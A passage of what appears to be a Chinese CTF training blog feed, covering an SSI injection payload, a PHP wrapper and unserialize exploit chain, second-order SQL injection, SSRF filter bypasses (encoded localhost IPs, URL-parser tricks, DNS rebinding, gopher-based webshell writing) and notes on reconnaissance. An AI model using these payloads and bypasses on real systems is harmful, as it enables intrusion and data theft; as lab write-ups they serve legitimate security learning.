class="hljs-title">md5</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(<span class="hljs-built_in">str</span>(x).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> md5(i).startswith(<span class="hljs-string">&#x27;6d0bc1&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>**********************************************************<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000000</span>):<br>    a = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> a[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>**********************************************************<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(<span class="hljs-built_in">str</span>(x).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> md5(i)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>得到2020666、2305004、9162671</p><p>登录后页面无信息，抓包发现相应包</p><blockquote><p>Url_Is_Here: public/6603ba4be4783686c502e6ed76359c091abe138d.shtml</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211230125824492.png"></p><p>注意到是shtml文件，ssi注入</p><blockquote><!--exec cmd="ls ../"></blockquote><p>在用户名处注入后，访问shtml即可</p><p>SSI注入：<a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SHTML%E6%96%87%E4%BB%B6">https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SHTML%E6%96%87%E4%BB%B6</a></p><p><a href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection">https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection</a></p><h2 id="浙江大学生信安决赛2019-逆转思维"><a href="#浙江大学生信安决赛2019-逆转思维" class="headerlink" title="浙江大学生信安决赛2019-逆转思维"></a>浙江大学生信安决赛2019-逆转思维</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = unserialize(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</p></blockquote><p>解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;HAHAHAHAHA&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>包含useless.php</p><blockquote><p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php</p></blockquote><p>传入password序列化字符串</p><blockquote><p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p>查看源码得到flag</p><h2 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h2><p><a href="http://www.tar.gz获得源码/">www.tar.gz获得源码</a></p><p>基本都包含了common.inc.php，在其中对用户输入进行了addslashes转义</p><p>文件上传中发现，对文件名和文件路径等信息在pathinfo函数分割，白名单校验；然后通过数据库插叙文件名和对应后缀是否存在，以此判断文件是否已经存在；最后将文件名和后缀存入数据库</p><p>再看重命名功能，首先验证用户是否输入了旧文件名和新文件名，查询数据库，旧文件名存在就update将查询到的存在的文件名更新到存在的文件名更新到数据库oldname字段中，导致文件名$result[‘filename’]再次入库，造成二次注入</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2020/11/20/ssrf/"/>
    <url>/2020/11/20/ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>前后端分离的业务下，服务器请求往往会有向本机或其所在内网的其他机器获取数据的过程，如果没有对请求的目标地址做过滤和限制，就会出现SSRF漏洞</p><p>常见的场景如：从指定URL获取资源，篡改该URL地址，指向内网或者外网</p><p>PHP中的函数和伪协议可能造成漏洞的有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">file_get_contents()<br>curl_exec()<br>fsockopen()<br><br>    <br>file:<span class="hljs-comment">//</span><br>dict:<span class="hljs-comment">//</span><br>gopher:<span class="hljs-comment">//</span><br>except:<span class="hljs-comment">//</span><br>...<br></code></pre></td></tr></table></figure><h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><p>内网扫描（端口，指纹识别）</p><p>伪协议攻击内网服务（gopher://），枚举敏感文件（file://）</p><h2 id="CTF题"><a href="#CTF题" class="headerlink" title="CTF题"></a>CTF题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>curl_init 初始化 curl 会话</p><p>curl_setopt 设置 curl 传输选项，CURLOPT_HEADER 启用时会将头文件的信息作为数据流输出；CURLOPT_RETURNTRANSFER 为 true 时将 curl_exec()获取的信息以字符串返回，而不是直接输出。</p><p>curl_exec($sh)抓取 URL 并把它传递给浏览器</p><p><a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((strlen(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123; <span class="hljs-comment">//strlen($host)&lt;=3</span><br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>开始过滤了，方法有：</p><h4 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h4><p>127.0.0.1 使用的是点分十进制 绕过如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>进制格式：<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>进制格式：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>进制整数格式：<span class="hljs-number">2130706433</span><br><br>特别的，在linux下，<span class="hljs-number">0</span>代表<span class="hljs-number">127.0.0.1</span>，可以用http://<span class="hljs-number">0</span>进行请求<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8 进制<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16 进制<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10 进制整数：<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linux：<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><blockquote><p>127.0.1 、127.1、 127。0.0.1 或者转成 2 进制</p><p><a href="http://sudo.cc/">http://sudo.cc/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!filter_var(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211117221246468.png"></p><p>var_filter 会检查不是私有地址，DNS 重绑定没有复现成功</p><p>测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//header(&quot;Location:www.baidu.com&quot;);</span><br>header(<span class="hljs-string">&quot;Location:404 Not Found&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里用到服务器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>header 会发送原生 http 头，一串字符串，上面代码就是用 js 的 Location 属性跳转到 127.0.0.1/flag.php，然后被 header 发回</p><p>预期解：</p><h4 id="DNS-重绑定"><a href="#DNS-重绑定" class="headerlink" title="DNS 重绑定"></a>DNS 重绑定</h4><p><a href="http://xip.io/">http://xip.io/</a></p><p><a href="http://ceye.io/">http://ceye.io/</a></p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="URL-bypass"><a href="#URL-bypass" class="headerlink" title="URL bypass"></a>URL bypass</h4><p>尝试夹杂@ # / \ ?，详见<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">blackhat 峰会</a>大佬提到的<code>parse_url</code>解析问题</p><p>需要以<code>http://ctf.</code>开头<code>show</code>结尾</p><blockquote><p>url=<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p></blockquote><h4 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h4><p>mysql 写马</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211117234343142.png"></p><p>将<code>gopher://127.0.0.1:3306/_</code>后面再编码一次，bp 发包，shell 传上</p><p>redis 同理</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集基础篇</title>
    <link href="/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>721第二次培训:<br>信息收集包括主动以及被动</p><p>本次任务有：分别用c 语言和php写 99 乘法表，csdn写博客（另：下星期由我分享win-dos内容）</p><h2 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1.被动信息收集"></a>1.被动信息收集</h2><p>域名信息查询（<a href="https://www.aizhan.com/">爱站网</a> <a href="http://tool.chinaz.com/">站长工具</a>）<br> 企业信息查询（<a href="https://www.qcc.com/">企查查</a> <a href="http://www.beian.gov.cn/portal/recordQuery">公安部备案查询</a>）<br>Github平台：泄露源码、数据库、邮箱、ftp、ssh、端口3389、个人信息、其他敏感信息</p><p>svn信息、邮件信息（通过爬虫、搜索引擎获取暴露的邮箱，邮件信息收集网站<a href="http://www.skymem.info/">1</a> <a href="http://www.hunter.io/">2</a> <a href="http://email-format.com/">3</a>）</p><p>Google Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000430989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>Shodan Hacking<br><img src="https://img-blog.csdnimg.cn/20201120004349809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>钟馗之眼-Zoomeye Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000442964.png#pic_center"><img src="https://img-blog.csdnimg.cn/20201120004448609.png#pic_center"></p><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>①直接与目标发生接触（被发现的风险极大）<br>②二层发现 优：扫描快、可靠     缺：不可路由(只能发现本网段的主机)<br>利用的是APR协议，抓包<br>命令有：<img src="https://img-blog.csdnimg.cn/20201120004858371.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004732355.png#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/20201120004205393.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004546683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>③三层发现<br><img src="https://img-blog.csdnimg.cn/20201120004928587.png#pic_center"><img src="https://img-blog.csdnimg.cn/20201120004938513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">④四层发现<br><img src="https://img-blog.csdnimg.cn/20201120005033130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><img src="https://img-blog.csdnimg.cn/20201120005051567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">任务：九九乘法表<br>C语言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 